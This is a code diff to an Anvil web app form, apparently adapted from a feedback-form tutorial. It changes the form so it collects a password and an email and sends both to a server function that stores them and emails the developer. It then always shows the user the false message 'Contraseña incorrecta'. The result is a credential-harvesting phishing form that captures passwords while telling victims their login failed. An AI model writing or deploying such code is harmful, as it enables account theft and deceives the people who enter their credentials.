@@ -30,21 +30,24 @@ class HomeForm(HomeFormTemplate):
   def submit_button_click(self, **event_args):
     # This method runs when the button is clicked.
     # First, we grab the contents of the text boxes:
-    name = self.name_box.text
+    name = self.passwd_box.text
     email = self.email_box.text
-    feedback = self.feedback_box.text
+    
 
     # Now we call our Server Module to save our input
     # in the database and send you an email:
-    anvil.server.call("add_feedback", name, email, feedback)
+    anvil.server.call("add_feedback", name, email)
     # (Hint: Find ServerModule1 under "Server Code" on the
     # left. Click on the folder icon if you can't see it.)
 
     # Display something to the user so they know it worked:
-    Notification("Feedback submitted!").show()
+    Notification("Contraseña incorrecta").show()
     self.clear_inputs()
 
   def clear_inputs(self):
-    self.name_box.text = ""
+    self.passwd_box.text = ""
     self.email_box.text = ""
-    self.feedback_box.text = ""
+
+  def passwd_box_pressed_enter(self, **event_args):
+    """This method is called when the user presses Enter in this text box"""
+    pass
